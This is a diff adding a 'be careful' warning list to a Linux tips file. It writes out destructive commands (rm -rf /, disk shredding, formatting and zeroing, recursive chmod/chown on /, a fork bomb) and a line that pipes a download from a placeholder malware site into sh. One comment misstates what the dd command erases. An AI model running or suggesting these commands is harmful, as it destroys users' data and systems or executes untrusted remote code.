@@ -1,5 +1,26 @@
 ### Linux tips.
 
+#### BECAREFUL!
+```sh
+
+rm -rf /            # Remove ALL data
+shred /dev/sda      # Remove ALL data
+mkfs.ext3 /dev/sda  # with formatting to Ext3
+
+sudo dd if=/dev/zero of=/dev/sda bs=8m # Write with zeros the 40mb from begin
+
+chmod -Rv 000 /          # Remove All Accesses to All files.
+chown -R nobody:nobody / # Set NOBODY as OWNER for all.
+chmod -R 777 /           # Allow ANYBODY to do EVERYTHING in the system
+
+:(){ :|:& };: # "fork bomb" to Fully fill All Memory (until boot)
+
+some_cmd > some_cfg_file.conf # Overwrite Config that can broke smth.
+
+wget http://some_MALWARE_site -O- | sh # Download and run Malawre))
+
+```
+#### SYSTEM MONITORING:
 ```sh
 journalctl -S "yyyy-MM-dd HH:mm:ss" --user
 
